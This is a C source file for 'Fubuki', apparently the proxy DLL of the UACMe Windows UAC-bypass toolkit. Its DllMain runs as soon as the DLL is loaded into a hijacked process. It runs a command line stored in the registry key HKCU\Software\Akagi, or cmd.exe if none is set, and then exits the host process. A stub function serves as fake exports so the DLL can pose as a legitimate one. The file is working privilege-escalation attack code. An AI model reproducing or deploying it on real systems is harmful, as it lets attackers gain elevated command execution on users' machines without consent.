/*******************************************************************************
*
*  (C) COPYRIGHT AUTHORS, 2014 - 2015
*
*  TITLE:       DLLMAIN.C
*
*  VERSION:     1.91
*
*  DATE:        12 Oct 2015
*
*  Proxy dll entry point, Fubuki Kai Ni.
*
* THIS CODE AND INFORMATION IS PROVIDED "AS IS" WITHOUT WARRANTY OF
* ANY KIND, EITHER EXPRESSED OR IMPLIED, INCLUDING BUT NOT LIMITED
* TO THE IMPLIED WARRANTIES OF MERCHANTABILITY AND/OR FITNESS FOR A
* PARTICULAR PURPOSE.
*
*******************************************************************************/

//disable nonmeaningful warnings.
#pragma warning(disable: 4005) // macro redefinition
#pragma warning(disable: 4055) // %s : from data pointer %s to function pointer %s
#pragma warning(disable: 4152) // nonstandard extension, function/data pointer conversion in expression
#pragma warning(disable: 4201) // nonstandard extension used : nameless struct/union
#pragma warning(disable: 6102) // Using %s from failed function call at line %u

#include <windows.h>
#include "..\shared\minirtl.h"

#if (_MSC_VER >= 1900) 
#ifdef _DEBUG
#pragma comment(lib, "vcruntimed.lib")
#pragma comment(lib, "ucrtd.lib")
#else
#pragma comment(lib, "libvcruntime.lib")
#endif
#endif

#define T_AKAGI_KEY    L"Software\\Akagi"
#define T_AKAGI_PARAM  L"LoveLetter"


/*
* DummyFunc
*
* Purpose:
*
* Stub for fake exports.
*
*/
VOID WINAPI DummyFunc(
	VOID
	)
{
}

/*
* ucmQueryCustomParameter
*
* Purpose:
*
* Query custom parameter and run it.
*
*/
BOOL ucmQueryCustomParameter(
	VOID
	)
{
	BOOL                    cond = FALSE, bResult = FALSE;
	HKEY                    hKey = NULL;
	LPWSTR                  lpParameter = NULL;
	LRESULT                 lRet;
	DWORD                   dwSize = 0;
	STARTUPINFOW            startupInfo;
	PROCESS_INFORMATION     processInfo;

	do {
		lRet = RegOpenKeyExW(HKEY_CURRENT_USER, T_AKAGI_KEY, 0, KEY_READ, &hKey);
		if ((lRet != ERROR_SUCCESS) || (hKey == NULL)) {
			break;
		}

		lRet = RegQueryValueExW(hKey, T_AKAGI_PARAM, NULL, NULL, (LPBYTE)NULL, &dwSize);
		if (lRet != ERROR_SUCCESS) {
			break;
		}

		lpParameter = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, dwSize + 1);
		if (lpParameter == NULL) {
			break;
		}

		lRet = RegQueryValueExW(hKey, T_AKAGI_PARAM, NULL, NULL, (LPBYTE)lpParameter, &dwSize);
		if (lRet == ERROR_SUCCESS) {

			OutputDebugStringW(L"Akagi letter found");
			OutputDebugStringW(lpParameter);

			RtlSecureZeroMemory(&startupInfo, sizeof(startupInfo));
			RtlSecureZeroMemory(&processInfo, sizeof(processInfo));
			startupInfo.cb = sizeof(startupInfo);
			GetStartupInfoW(&startupInfo);

			bResult = CreateProcessW(NULL, lpParameter, NULL, NULL, FALSE, 0, NULL,
				NULL, &startupInfo, &processInfo);

			if (bResult) {
				CloseHandle(processInfo.hProcess);
				CloseHandle(processInfo.hThread);
			}

		}
		HeapFree(GetProcessHeap(), 0, lpParameter);

		RegCloseKey(hKey);
		hKey = NULL;
		RegDeleteKey(HKEY_CURRENT_USER, T_AKAGI_KEY);

	} while (cond);

	if (hKey != NULL) {
		RegCloseKey(hKey);
	}

	return bResult;
}


/*
* DllMain
*
* Purpose:
*
* Proxy dll entry point, start cmd.exe and exit immediatelly.
*
*/
BOOL WINAPI DllMain(
	_In_ HINSTANCE hinstDLL,
	_In_ DWORD fdwReason,
	_In_ LPVOID lpvReserved
	)
{
	DWORD					cch;
	TCHAR					cmdbuf[MAX_PATH * 2], sysdir[MAX_PATH + 1];
	STARTUPINFO				startupInfo;
	PROCESS_INFORMATION		processInfo;

	UNREFERENCED_PARAMETER(hinstDLL);
	UNREFERENCED_PARAMETER(lpvReserved);

	if (fdwReason == DLL_PROCESS_ATTACH) {
		OutputDebugStringW(L"UACMe injected, Fubuki at your service.\r\n");

		if (!ucmQueryCustomParameter()) {

			RtlSecureZeroMemory(&startupInfo, sizeof(startupInfo));
			RtlSecureZeroMemory(&processInfo, sizeof(processInfo));
			startupInfo.cb = sizeof(startupInfo);
			GetStartupInfoW(&startupInfo);

			RtlSecureZeroMemory(sysdir, sizeof(sysdir));
			cch = ExpandEnvironmentStrings(TEXT("%systemroot%\\system32\\"), sysdir, MAX_PATH);
			if ((cch != 0) && (cch < MAX_PATH)) {
				RtlSecureZeroMemory(cmdbuf, sizeof(cmdbuf));
				_strcpy(cmdbuf, sysdir);
				_strcat(cmdbuf, TEXT("cmd.exe"));

				if (CreateProcessW(cmdbuf, NULL, NULL, NULL, FALSE, 0, NULL,
					sysdir, &startupInfo, &processInfo))
				{
					CloseHandle(processInfo.hProcess);
					CloseHandle(processInfo.hThread);
				}
			}

		}
		ExitProcess(0);
	}
	return TRUE;
}
